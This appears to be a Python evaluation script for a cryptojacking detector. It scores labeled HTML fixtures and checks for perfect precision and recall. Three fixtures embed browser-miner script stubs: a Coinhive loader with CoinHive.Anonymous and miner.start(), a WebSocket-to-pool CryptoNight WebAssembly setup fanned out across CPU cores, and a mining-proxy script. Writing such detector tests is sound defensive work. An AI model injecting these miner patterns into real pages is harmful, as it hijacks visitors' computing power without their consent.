#!/usr/bin/env python3
"""Reproducible eval for browser_detect.

Scores a labeled set of pages -- real Coinhive-style miners vs benign
look-alikes (including a security blog that only *mentions* coinhive in prose,
and a legitimate WebAssembly game) -- and asserts precision == recall == 1.0.
Deterministic (pure static analysis, no timing), so it is CI-safe. Exit 0 on
pass, 1 on failure.
"""
import sys
import browser_detect as bd

# ---------------- malicious pages (must be HIGH) ----------------
M1_COINHIVE = """<!doctype html><html><head><title>Free Movies</title>
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
</head><body>
<h1>Watch now</h1>
<script>
  var miner = new CoinHive.Anonymous('SITE_KEY_XXX', {throttle: 0.2});
  miner.start();
</script>
</body></html>"""

M2_WASM_WS = """<!doctype html><html><body>
<script>
  const socket = new WebSocket("wss://ws.coinimp.com/proxy");
  WebAssembly.instantiateStreaming(fetch('cryptonight.wasm'));
  const n = navigator.hardwareConcurrency || 4;
  for (let i = 0; i < n; i++) { new Worker('worker.js'); }
  let hashesPerSecond = 0;
</script>
</body></html>"""

M3_AUTHEDMINE = """<!doctype html><html><head>
<script src="https://www.hostingcloud.racing/deadbeef.js"></script>
</head><body>
<script>
  var c = new Client.Anonymous('key', {threads: navigator.hardwareConcurrency});
  startMining();
</script>
</body></html>"""

# ---------------- benign pages (must NOT be HIGH) ----------------
B1_NORMAL = """<!doctype html><html><head>
<script src="https://www.google-analytics.com/analytics.js"></script>
</head><body><h1>Welcome to my bakery</h1><p>Fresh bread daily.</p></body></html>"""

# Legit WebAssembly game that also fans workers across cores -> two WEAK signals,
# no strong signal -> must stay MED, never HIGH. This is the key precision case.
B2_WASM_GAME = """<!doctype html><html><body>
<canvas id="game"></canvas>
<script>
  WebAssembly.instantiateStreaming(fetch('game.wasm'));
  const cores = navigator.hardwareConcurrency || 4;
  for (let i = 0; i < cores; i++) { new Worker('physics.js'); }
</script>
</body></html>"""

# Security blog ABOUT cryptojacking: the words coinhive/cryptonight appear only
# in visible prose, never in a <script>. Must not be flagged.
B3_BLOG = """<!doctype html><html><head><title>What was Coinhive?</title>
<script src="https://cdn.jsdelivr.net/npm/prismjs/prism.js"></script>
</head><body>
<article>
  <h1>Coinhive and the rise of cryptojacking</h1>
  <p>Coinhive was a service that mined Monero using a CryptoNight WebAssembly
  miner embedded in web pages. Attackers would call CoinHive.Anonymous() to
  start mining in a visitor's browser. It shut down in 2019.</p>
</article>
</body></html>"""

B4_CDN = """<!doctype html><html><head>
<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
<script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
</head><body><div id="root"></div></body></html>"""


def main():
    cases = [
        ("M1_coinhive_classic", M1_COINHIVE, True),
        ("M2_wasm_websocket", M2_WASM_WS, True),
        ("M3_authedmine_proxy", M3_AUTHEDMINE, True),
        ("B1_normal_site", B1_NORMAL, False),
        ("B2_wasm_game", B2_WASM_GAME, False),
        ("B3_blog_about_coinhive", B3_BLOG, False),
        ("B4_legit_cdns", B4_CDN, False),
    ]
    tp = fp = fn = tn = 0
    print("%-24s %-6s %-5s %s" % ("LABEL", "EXPECT", "BAND", "SIGNALS"))
    print("-" * 72)
    for label, html, exp in cases:
        r = bd.scan_html(html, source=label)
        got = r["is_high"]
        if exp and got:
            tp += 1
        elif exp and not got:
            fn += 1
        elif (not exp) and got:
            fp += 1
        else:
            tn += 1
        print("%-24s %-6s %-5s %s" % (
            label, "MINER" if exp else "benign", r["band"], ",".join(r["signals"]) or "-"))

    prec = tp / (tp + fp) if (tp + fp) else 0.0
    rec = tp / (tp + fn) if (tp + fn) else 0.0
    f1 = 2 * prec * rec / (prec + rec) if (prec + rec) else 0.0
    print("-" * 72)
    print("TP=%d FP=%d FN=%d TN=%d  Precision=%.2f Recall=%.2f F1=%.2f"
          % (tp, fp, fn, tn, prec, rec, f1))
    ok = (prec == 1.0 and rec == 1.0)
    print("RESULT:", "PASS" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
